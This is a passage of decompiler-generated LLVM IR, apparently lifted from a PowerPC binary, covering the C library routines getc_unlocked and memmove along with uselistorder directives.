  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10013890.646 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3fc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d35c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d30c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d2a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d294, { 1, 0 }
  uselistorder label %dec_label_pc_1000d278, { 1, 0 }
  uselistorder label %dec_label_pc_1000d250, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d230, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d20c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d160, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d054, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d034, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ceb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce08, { 1, 0 }
  uselistorder label %dec_label_pc_1000cddc, { 1, 0 }
  uselistorder label %dec_label_pc_1000cdd0, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000d450 = load i32, i32* @lr, align 4
  store i32 %v0_1000d450, i32* %r0.global-to-local, align 4
  %v0_1000d458 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000d464 = add i32 %tmp, 16
  %v3_1000d464 = inttoptr i32 %v2_1000d464 to i32*
  %v4_1000d464 = load i32, i32* %v3_1000d464, align 4
  store i32 %v4_1000d464, i32* %r9.global-to-local, align 4
  %v2_1000d468 = add i32 %tmp, 24
  %v3_1000d468 = inttoptr i32 %v2_1000d468 to i32*
  %v4_1000d468 = load i32, i32* %v3_1000d468, align 4
  store i32 %v4_1000d468, i32* %r0.global-to-local, align 4
  %v2_1000d46c = icmp ult i32 %v4_1000d464, %v4_1000d468
  br i1 %v2_1000d46c, label %dec_label_pc_1000d4d4, label %dec_label_pc_1000d474

dec_label_pc_1000d474:                            ; preds = %entry
  %v3_1000d474 = load i16, i16* %arg1, align 2
  %v4_1000d474 = zext i16 %v3_1000d474 to i32
  %v1_1000d478 = and i32 %v4_1000d474, 131
  store i32 %v1_1000d478, i32* %r0.global-to-local, align 4
  %v2_1000d47c = icmp ugt i32 %v1_1000d478, 128
  br i1 %v2_1000d47c, label %dec_label_pc_1000d494, label %dec_label_pc_1000d484

dec_label_pc_1000d484:                            ; preds = %dec_label_pc_1000d474
  store i32 268489868, i32* @lr, align 4
  %v3_1000d488 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_1000d464)
  store i32 %v3_1000d488, i32* %r3.global-to-local, align 4
  %v3_1000d48c = icmp eq i32 %v3_1000d488, 0
  br i1 %v3_1000d48c, label %dec_label_pc_1000d484.dec_label_pc_1000d494_crit_edge, label %dec_label_pc_1000d570

dec_label_pc_1000d484.dec_label_pc_1000d494_crit_edge: ; preds = %dec_label_pc_1000d484
  %v0_1000d494.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d494

dec_label_pc_1000d494:                            ; preds = %dec_label_pc_1000d484.dec_label_pc_1000d494_crit_edge, %dec_label_pc_1000d474
  %v2_1000d4f4 = phi i32 [ %v0_1000d494.pre, %dec_label_pc_1000d484.dec_label_pc_1000d494_crit_edge ], [ %tmp, %dec_label_pc_1000d474 ]
  %v1_1000d494 = inttoptr i32 %v2_1000d4f4 to i16*
  %v2_1000d494 = load i16, i16* %v1_1000d494, align 2
  %v3_1000d494 = zext i16 %v2_1000d494 to i32
  %v1_1000d498 = and i32 %v3_1000d494, 2
  store i32 %v1_1000d498, i32* %r0.global-to-local, align 4
  %v3_1000d498 = icmp eq i32 %v1_1000d498, 0
  br i1 %v3_1000d498, label %dec_label_pc_1000d4c4, label %dec_label_pc_1000d4a0

dec_label_pc_1000d4a0:                            ; preds = %dec_label_pc_1000d494
  %v1_1000d4a0 = call i32 @__asm_rlwinm(i32 %v3_1000d494, i32 2, i32 29, i32 29)
  %v1_1000d4a4 = load i32, i32* @r31, align 4
  %v2_1000d4a4 = add i32 %v1_1000d4a4, %v1_1000d4a0
  store i32 %v2_1000d4a4, i32* %r9.global-to-local, align 4
  %v1_1000d4a8 = add i32 %v2_1000d4a4, 39
  %v2_1000d4a8 = inttoptr i32 %v1_1000d4a8 to i8*
  %v3_1000d4a8 = load i8, i8* %v2_1000d4a8, align 1
  %v4_1000d4a8 = zext i8 %v3_1000d4a8 to i32
  store i32 %v4_1000d4a8, i32* %r0.global-to-local, align 4
  %v1_1000d4ac = add nsw i32 %v3_1000d494, -1
  store i32 %v1_1000d4ac, i32* %r9.global-to-local, align 4
  %v1_1000d4b0 = trunc i32 %v1_1000d4ac to i16
  %v3_1000d4b0 = inttoptr i32 %v1_1000d4a4 to i16*
  store i16 %v1_1000d4b0, i16* %v3_1000d4b0, align 2
  %v0_1000d4b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d4b4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d4bc = load i32, i32* @r31, align 4
  %v2_1000d4bc = add i32 %v1_1000d4bc, 40
  %v3_1000d4bc = inttoptr i32 %v2_1000d4bc to i32*
  store i32 0, i32* %v3_1000d4bc, align 4
  br label %dec_label_pc_1000d574

dec_label_pc_1000d4c4:                            ; preds = %dec_label_pc_1000d494
  %v1_1000d4c4 = add i32 %v2_1000d4f4, 16
  %v2_1000d4c4 = inttoptr i32 %v1_1000d4c4 to i32*
  %v3_1000d4c4 = load i32, i32* %v2_1000d4c4, align 4
  store i32 %v3_1000d4c4, i32* %r9.global-to-local, align 4
  %v1_1000d4c8 = add i32 %v2_1000d4f4, 20
  %v2_1000d4c8 = inttoptr i32 %v1_1000d4c8 to i32*
  %v3_1000d4c8 = load i32, i32* %v2_1000d4c8, align 4
  store i32 %v3_1000d4c8, i32* %r0.global-to-local, align 4
  %v4_1000d4cc = icmp eq i32 %v3_1000d4c8, %v3_1000d4c4
  br i1 %v4_1000d4cc, label %dec_label_pc_1000d4e0, label %dec_label_pc_1000d4d4

dec_label_pc_1000d4d4:                            ; preds = %dec_label_pc_1000d4c4, %entry
  %v1_1000d5487 = phi i32 [ %v2_1000d4f4, %dec_label_pc_1000d4c4 ], [ %tmp, %entry ]
  %v0_1000d4d4 = phi i32 [ %v3_1000d4c4, %dec_label_pc_1000d4c4 ], [ %v4_1000d464, %entry ]
  %v1_1000d4d4 = inttoptr i32 %v0_1000d4d4 to i8*
  %v2_1000d4d4 = load i8, i8* %v1_1000d4d4, align 1
  %v3_1000d4d4 = zext i8 %v2_1000d4d4 to i32
  store i32 %v3_1000d4d4, i32* %r3.global-to-local, align 4
  %v1_1000d4d8 = add i32 %v0_1000d4d4, 1
  store i32 %v1_1000d4d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d548

dec_label_pc_1000d4e0:                            ; preds = %dec_label_pc_1000d4c4
  %v1_1000d4e0 = add i32 %v2_1000d4f4, 4
  %v2_1000d4e0 = inttoptr i32 %v1_1000d4e0 to i32*
  %v3_1000d4e0 = load i32, i32* %v2_1000d4e0, align 4
  store i32 %v3_1000d4e0, i32* %r0.global-to-local, align 4
  %v3_1000d4e4 = icmp eq i32 %v3_1000d4e0, -2
  br i1 %v3_1000d4e4, label %dec_label_pc_1000d4ec, label %dec_label_pc_1000d4fc

dec_label_pc_1000d4ec:                            ; preds = %dec_label_pc_1000d4e0
  %v1_1000d4ec = or i32 %v3_1000d494, 4
  store i32 %v1_1000d4ec, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000d4f4 = trunc i32 %v1_1000d4ec to i16
  store i16 %v1_1000d4f4, i16* %v1_1000d494, align 2
  br label %dec_label_pc_1000d574

dec_label_pc_1000d4fc:                            ; preds = %dec_label_pc_1000d4e0
  %v1_1000d4fc = and i32 %v3_1000d494, 768
  store i32 %v1_1000d4fc, i32* %r0.global-to-local, align 4
  %v3_1000d4fc = icmp eq i32 %v1_1000d4fc, 0
  br i1 %v3_1000d4fc, label %dec_label_pc_1000d510, label %dec_label_pc_1000d504

dec_label_pc_1000d504:                            ; preds = %dec_label_pc_1000d4fc
  store i32 ptrtoint (i32** @global_var_10024a10.570 to i32), i32* %r3.global-to-local, align 4
  store i32 268490000, i32* @lr, align 4
  %v4_1000d50c = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_10024a10.570 to i16*), i32 %v3_1000d4c4)
  store i32 %v4_1000d50c, i32* %r3.global-to-local, align 4
  %v0_1000d510.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d510

dec_label_pc_1000d510:                            ; preds = %dec_label_pc_1000d4fc, %dec_label_pc_1000d504
  %v0_1000d550 = phi i32 [ %v2_1000d4f4, %dec_label_pc_1000d4fc ], [ %v0_1000d510.pre, %dec_label_pc_1000d504 ]
  %v1_1000d510 = add i32 %v0_1000d550, 8
  %v2_1000d510 = inttoptr i32 %v1_1000d510 to i32*
  %v3_1000d510 = load i32, i32* %v2_1000d510, align 4
  store i32 %v3_1000d510, i32* %r9.global-to-local, align 4
  %v1_1000d514 = add i32 %v0_1000d550, 12
  %v2_1000d514 = inttoptr i32 %v1_1000d514 to i32*
  %v3_1000d514 = load i32, i32* %v2_1000d514, align 4
  store i32 %v3_1000d514, i32* %r0.global-to-local, align 4
  %v4_1000d518 = icmp eq i32 %v3_1000d514, %v3_1000d510
  br i1 %v4_1000d518, label %dec_label_pc_1000d550, label %dec_label_pc_1000d520

dec_label_pc_1000d520:                            ; preds = %dec_label_pc_1000d510
  %v2_1000d520 = add i32 %v0_1000d550, 24
  %v3_1000d520 = inttoptr i32 %v2_1000d520 to i32*
  store i32 %v3_1000d510, i32* %v3_1000d520, align 4
  %v0_1000d524 = load i32, i32* @r31, align 4
  store i32 %v0_1000d524, i32* %r3.global-to-local, align 4
  store i32 268490028, i32* @lr, align 4
  %v3_1000d528 = call i32 @__stdio_rfill(i32 %v0_1000d524, i32 %v3_1000d510)
  store i32 %v3_1000d528, i32* %r3.global-to-local, align 4
  %v3_1000d52c = icmp eq i32 %v3_1000d528, 0
  br i1 %v3_1000d52c, label %dec_label_pc_1000d570, label %dec_label_pc_1000d534

dec_label_pc_1000d534:                            ; preds = %dec_label_pc_1000d520
  %v0_1000d534 = load i32, i32* @r31, align 4
  %v1_1000d534 = add i32 %v0_1000d534, 20
  %v2_1000d534 = inttoptr i32 %v1_1000d534 to i32*
  %v3_1000d534 = load i32, i32* %v2_1000d534, align 4
  store i32 %v3_1000d534, i32* %r0.global-to-local, align 4
  %v1_1000d538 = add i32 %v0_1000d534, 16
  %v2_1000d538 = inttoptr i32 %v1_1000d538 to i32*
  %v3_1000d538 = load i32, i32* %v2_1000d538, align 4
  store i32 %v3_1000d538, i32* %r9.global-to-local, align 4
  %v2_1000d53c = add i32 %v0_1000d534, 24
  %v3_1000d53c = inttoptr i32 %v2_1000d53c to i32*
  store i32 %v3_1000d534, i32* %v3_1000d53c, align 4
  %v0_1000d540 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d540 = add i32 %v0_1000d540, 1
  store i32 %v1_1000d540, i32* %r0.global-to-local, align 4
  %v1_1000d544 = inttoptr i32 %v0_1000d540 to i8*
  %v2_1000d544 = load i8, i8* %v1_1000d544, align 1
  %v3_1000d544 = zext i8 %v2_1000d544 to i32
  store i32 %v3_1000d544, i32* %r3.global-to-local, align 4
  %v1_1000d548.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d548

dec_label_pc_1000d548:                            ; preds = %dec_label_pc_1000d4d4, %dec_label_pc_1000d534
  %v1_1000d548 = phi i32 [ %v1_1000d5487, %dec_label_pc_1000d4d4 ], [ %v1_1000d548.pre, %dec_label_pc_1000d534 ]
  %v0_1000d548 = phi i32 [ %v1_1000d4d8, %dec_label_pc_1000d4d4 ], [ %v1_1000d540, %dec_label_pc_1000d534 ]
  %v2_1000d548 = add i32 %v1_1000d548, 16
  %v3_1000d548 = inttoptr i32 %v2_1000d548 to i32*
  store i32 %v0_1000d548, i32* %v3_1000d548, align 4
  br label %dec_label_pc_1000d574

dec_label_pc_1000d550:                            ; preds = %dec_label_pc_1000d510
  %v1_1000d550 = inttoptr i32 %v0_1000d550 to i16*
  store i32 %v0_1000d550, i32* %r3.global-to-local, align 4
  %v2_1000d554 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268490080, i32* @lr, align 4
  %v5_1000d55c = call i32 @__stdio_READ(i16* %v1_1000d550, i32 %v2_1000d554, i32 1)
  store i32 %v5_1000d55c, i32* %r3.global-to-local, align 4
  %v3_1000d560 = icmp eq i32 %v5_1000d55c, 0
  br i1 %v3_1000d560, label %dec_label_pc_1000d570, label %dec_label_pc_1000d568

dec_label_pc_1000d568:                            ; preds = %dec_label_pc_1000d550
  %v3_1000d568 = load i8, i8* %stack_var_-24, align 1
  %v4_1000d568 = sext i8 %v3_1000d568 to i32
  store i32 %v4_1000d568, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d574

dec_label_pc_1000d570:                            ; preds = %dec_label_pc_1000d484, %dec_label_pc_1000d550, %dec_label_pc_1000d520
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d574

dec_label_pc_1000d574:                            ; preds = %dec_label_pc_1000d568, %dec_label_pc_1000d548, %dec_label_pc_1000d4ec, %dec_label_pc_1000d4a0, %dec_label_pc_1000d570
  store i32 %v0_1000d450, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d458, i32* @r31, align 4
  %v0_1000d584 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d584

; uselistorder directives
  uselistorder i32 %v0_1000d550, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000d4d4, { 1, 0 }
  uselistorder i32 %v3_1000d4c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000d4a4, { 1, 0 }
  uselistorder i32 %v3_1000d494, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_1000d4f4, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_10024a10.570 to i16*), { 1, 0 }
  uselistorder i16* @global_var_100246e4.558, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d574, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000d570, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d548, { 1, 0 }
  uselistorder label %dec_label_pc_1000d510, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000d588 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000d590 = load i32, i32* @r5, align 4
  store i32 %v0_1000d590, i32* @r11, align 4
  br i1 %v2_1000d588, label %dec_label_pc_1000d59c, label %dec_label_pc_1000d598

dec_label_pc_1000d598:                            ; preds = %entry
  %v0_1000d598 = call i32 @memcpy()
  store i32 %v0_1000d598, i32* @r3, align 4
  %v0_1000d59c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000d59c

dec_label_pc_1000d59c:                            ; preds = %entry, %dec_label_pc_1000d598
  %v0_1000d59c = phi i32 [ %v0_1000d590, %entry ], [ %v0_1000d59c.pre, %dec_label_pc_1000d598 ]
  %v1_1000d59c = call i32 @__asm_rlwinm.(i32 %v0_1000d59c, i32 29, i32 3, i32 31)
  store i32 %v1_1000d59c, i32* %r9.global-to-local, align 4
  %v4_1000d59c = icmp eq i32 %v1_1000d59c, 0
  %v1_1000d5a0 = load i32, i32* @r5, align 4
  %v2_1000d5a0 = add i32 %v1_1000d5a0, %arg2
  store i32 %v2_1000d5a0, i32* %r4.global-to-local, align 4
  %v0_1000d5a4 = load i32, i32* @r3, align 4
  %v2_1000d5a4 = add i32 %v0_1000d5a4, %v1_1000d5a0
  store i32 %v2_1000d5a4, i32* %r10.global-to-local, align 4
  br i1 %v4_1000d59c, label %dec_label_pc_1000d5cc, label %dec_label_pc_1000d5ac

dec_label_pc_1000d5ac:                            ; preds = %dec_label_pc_1000d59c
  %v1_1000d5ac = urem i32 %v2_1000d5a4, 4
  %v3_1000d5ac = icmp eq i32 %v1_1000d5ac, 0
  br i1 %v3_1000d5ac, label %dec_label_pc_1000d5b4, label %dec_label_pc_1000d600

dec_label_pc_1000d5b4:                            ; preds = %dec_label_pc_1000d618.dec_label_pc_1000d5b4_crit_edge, %dec_label_pc_1000d5ac
  %v1_1000d5c0.pre = phi i32 [ %v1_1000d5c0.pre.pre, %dec_label_pc_1000d618.dec_label_pc_1000d5b4_crit_edge ], [ %v2_1000d5a4, %dec_label_pc_1000d5ac ]
  %v0_1000d5b4 = phi i32 [ %v1_1000d618, %dec_label_pc_1000d618.dec_label_pc_1000d5b4_crit_edge ], [ %v1_1000d59c, %dec_label_pc_1000d5ac ]
  store i32 %v0_1000d5b4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d5b8

dec_label_pc_1000d5b8:                            ; preds = %dec_label_pc_1000d5b8, %dec_label_pc_1000d5b4
  %v1_1000d5c0 = phi i32 [ %v2_1000d5c4, %dec_label_pc_1000d5b8 ], [ %v1_1000d5c0.pre, %dec_label_pc_1000d5b4 ]
  %v0_1000d5b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d5b8 = add i32 %v0_1000d5b8, -4
  %v2_1000d5b8 = inttoptr i32 %v1_1000d5b8 to i32*
  %v3_1000d5b8 = load i32, i32* %v2_1000d5b8, align 4
  %v1_1000d5bc = add i32 %v0_1000d5b8, -8
  %v2_1000d5bc = inttoptr i32 %v1_1000d5bc to i32*
  %v3_1000d5bc = load i32, i32* %v2_1000d5bc, align 4
  store i32 %v3_1000d5bc, i32* %r9.global-to-local, align 4
  store i32 %v1_1000d5bc, i32* %r4.global-to-local, align 4
  %v2_1000d5c0 = add i32 %v1_1000d5c0, -4
  %v3_1000d5c0 = inttoptr i32 %v2_1000d5c0 to i32*
  store i32 %v3_1000d5b8, i32* %v3_1000d5c0, align 4
  %v0_1000d5c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d5c4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d5c4 = add i32 %v1_1000d5c4, -8
  %v3_1000d5c4 = inttoptr i32 %v2_1000d5c4 to i32*
  store i32 %v0_1000d5c4, i32* %v3_1000d5c4, align 4
  store i32 %v2_1000d5c4, i32* %r10.global-to-local, align 4
  %v0_1000d5c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5c8 = add i32 %v0_1000d5c8, -1
  store i32 %v1_1000d5c8, i32* %ctr.global-to-local, align 4
  %v2_1000d5c8 = icmp eq i32 %v1_1000d5c8, 0
  br i1 %v2_1000d5c8, label %dec_label_pc_1000d5cc, label %dec_label_pc_1000d5b8

dec_label_pc_1000d5cc:                            ; preds = %dec_label_pc_1000d5b8, %dec_label_pc_1000d618, %dec_label_pc_1000d59c
  %v0_1000d5cc = load i32, i32* @r11, align 4
  %v1_1000d5cc = urem i32 %v0_1000d5cc, 8
  store i32 %v1_1000d5cc, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000d5cc, 4
  br i1 %tmp, label %dec_label_pc_1000d5e4, label %dec_label_pc_1000d5d8

dec_label_pc_1000d5d8:                            ; preds = %dec_label_pc_1000d5cc
  %v0_1000d5d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d5d8 = add i32 %v0_1000d5d8, -4
  %v2_1000d5d8 = inttoptr i32 %v1_1000d5d8 to i32*
  %v3_1000d5d8 = load i32, i32* %v2_1000d5d8, align 4
  store i32 %v1_1000d5d8, i32* %r4.global-to-local, align 4
  %v1_1000d5dc = add nsw i32 %v1_1000d5cc, -4
  store i32 %v1_1000d5dc, i32* %r5.global-to-local, align 4
  %v1_1000d5e0 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d5e0 = add i32 %v1_1000d5e0, -4
  %v3_1000d5e0 = inttoptr i32 %v2_1000d5e0 to i32*
  store i32 %v3_1000d5d8, i32* %v3_1000d5e0, align 4
  store i32 %v2_1000d5e0, i32* %r10.global-to-local, align 4
  %v0_1000d5e4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d5e4

dec_label_pc_1000d5e4:                            ; preds = %dec_label_pc_1000d5cc, %dec_label_pc_1000d5d8
  %v0_1000d5ec = phi i32 [ %v1_1000d5cc, %dec_label_pc_1000d5cc ], [ %v0_1000d5e4.pre, %dec_label_pc_1000d5d8 ]
  %v3_1000d5e4 = icmp eq i32 %v0_1000d5ec, 0
  br i1 %v3_1000d5e4, label %dec_label_pc_1000d624, label %dec_label_pc_1000d5ec

dec_label_pc_1000d5ec:                            ; preds = %dec_label_pc_1000d5e4
  store i32 %v0_1000d5ec, i32* %ctr.global-to-local, align 4
  %v2_1000d5f4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d5f0

dec_label_pc_1000d5f0:                            ; preds = %dec_label_pc_1000d5f0, %dec_label_pc_1000d5ec
  %v2_1000d5f4 = phi i32 [ %v3_1000d5f4, %dec_label_pc_1000d5f0 ], [ %v2_1000d5f4.pre, %dec_label_pc_1000d5ec ]
  %v0_1000d5f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d5f0 = add i32 %v0_1000d5f0, -1
  %v2_1000d5f0 = inttoptr i32 %v1_1000d5f0 to i8*
  %v3_1000d5f0 = load i8, i8* %v2_1000d5f0, align 1
  store i32 %v1_1000d5f0, i32* %r4.global-to-local, align 4
  %v3_1000d5f4 = add i32 %v2_1000d5f4, -1
  %v4_1000d5f4 = inttoptr i32 %v3_1000d5f4 to i8*
  store i8 %v3_1000d5f0, i8* %v4_1000d5f4, align 1
  store i32 %v3_1000d5f4, i32* %r10.global-to-local, align 4
  %v0_1000d5f8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5f8 = add i32 %v0_1000d5f8, -1
  store i32 %v1_1000d5f8, i32* %ctr.global-to-local, align 4
  %v2_1000d5f8 = icmp eq i32 %v1_1000d5f8, 0
  br i1 %v2_1000d5f8, label %dec_label_pc_1000d624, label %dec_label_pc_1000d5f0

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5ac
  %v1_1000d600 = sub nsw i32 4, %v1_1000d5ac
  store i32 %v1_1000d600, i32* %ctr.global-to-local, align 4
  %v2_1000d608 = sub i32 %v1_1000d5a0, %v1_1000d600
  store i32 %v2_1000d608, i32* @r11, align 4
  %v1_1000d60c9 = add i32 %v2_1000d5a0, -1
  %v2_1000d60c10 = inttoptr i32 %v1_1000d60c9 to i8*
  %v3_1000d60c11 = load i8, i8* %v2_1000d60c10, align 1
  store i32 %v1_1000d60c9, i32* %r4.global-to-local, align 4
  %v3_1000d61013 = add i32 %v2_1000d5a4, -1
  %v4_1000d61014 = inttoptr i32 %v3_1000d61013 to i8*
  store i8 %v3_1000d60c11, i8* %v4_1000d61014, align 1
  store i32 %v3_1000d61013, i32* %r10.global-to-local, align 4
  %v0_1000d61415 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d61416 = add i32 %v0_1000d61415, -1
  store i32 %v1_1000d61416, i32* %ctr.global-to-local, align 4
  %v2_1000d61417 = icmp eq i32 %v1_1000d61416, 0
  br i1 %v2_1000d61417, label %dec_label_pc_1000d618, label %dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge

dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge: ; preds = %dec_label_pc_1000d600, %dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge
  %v3_1000d61018 = phi i32 [ %v3_1000d610, %dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge ], [ %v3_1000d61013, %dec_label_pc_1000d600 ]
  %v0_1000d60c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d60c = add i32 %v0_1000d60c.pre, -1
  %v2_1000d60c = inttoptr i32 %v1_1000d60c to i8*
  %v3_1000d60c = load i8, i8* %v2_1000d60c, align 1
  store i32 %v1_1000d60c, i32* %r4.global-to-local, align 4
  %v3_1000d610 = add i32 %v3_1000d61018, -1
  %v4_1000d610 = inttoptr i32 %v3_1000d610 to i8*
  store i8 %v3_1000d60c, i8* %v4_1000d610, align 1
  store i32 %v3_1000d610, i32* %r10.global-to-local, align 4
  %v0_1000d614 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d614 = add i32 %v0_1000d614, -1
  store i32 %v1_1000d614, i32* %ctr.global-to-local, align 4
  %v2_1000d614 = icmp eq i32 %v1_1000d614, 0
  br i1 %v2_1000d614, label %dec_label_pc_1000d618, label %dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge

dec_label_pc_1000d618:                            ; preds = %dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge, %dec_label_pc_1000d600
  %v0_1000d618 = load i32, i32* @r11, align 4
  %v1_1000d618 = call i32 @__asm_rlwinm.(i32 %v0_1000d618, i32 29, i32 3, i32 31)
  store i32 %v1_1000d618, i32* %r9.global-to-local, align 4
  %v4_1000d618 = icmp eq i32 %v1_1000d618, 0
  br i1 %v4_1000d618, label %dec_label_pc_1000d5cc, label %dec_label_pc_1000d618.dec_label_pc_1000d5b4_crit_edge

dec_label_pc_1000d618.dec_label_pc_1000d5b4_crit_edge: ; preds = %dec_label_pc_1000d618
  %v1_1000d5c0.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d5b4

dec_label_pc_1000d624:                            ; preds = %dec_label_pc_1000d5f0, %dec_label_pc_1000d5e4
  %v0_1000d624 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000d624

; uselistorder directives
  uselistorder i32 %v1_1000d618, { 1, 2, 0 }
  uselistorder i32 %v1_1000d614, { 1, 0 }
  uselistorder i32 %v3_1000d610, { 1, 2, 0 }
  uselistorder i32 %v1_1000d5f8, { 1, 0 }
  uselistorder i32 %v3_1000d5f4, { 1, 2, 0 }
  uselistorder i32 %v1_1000d5cc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d5c8, { 1, 0 }
  uselistorder i32 %v2_1000d5c4, { 1, 2, 0 }
  uselistorder i32 %v1_1000d5ac, { 1, 0 }
  uselistorder i32 %v2_1000d5a4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000d5a0, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 6, 4, 7, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
